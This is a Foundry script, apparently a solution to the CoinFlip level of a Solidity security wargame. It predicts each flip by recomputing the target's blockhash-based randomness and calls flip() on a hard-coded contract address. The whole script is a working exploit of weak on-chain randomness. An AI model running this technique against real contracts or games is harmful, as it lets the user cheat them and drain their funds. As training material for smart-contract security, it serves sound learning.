// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "../src/level3.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

contract POC is Script {
    using SafeMath for uint256;
    CoinFlip level3 = CoinFlip(0xa350cC6B1dCC09E4fCF88B3959Fa7567Ae207A2B);

    function run() external {
        vm.startBroadcast();

        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        level3.flip(side);

        console.log("Consecutive Wins: ", level3.consecutiveWins());

        vm.stopBroadcast();
    }
}
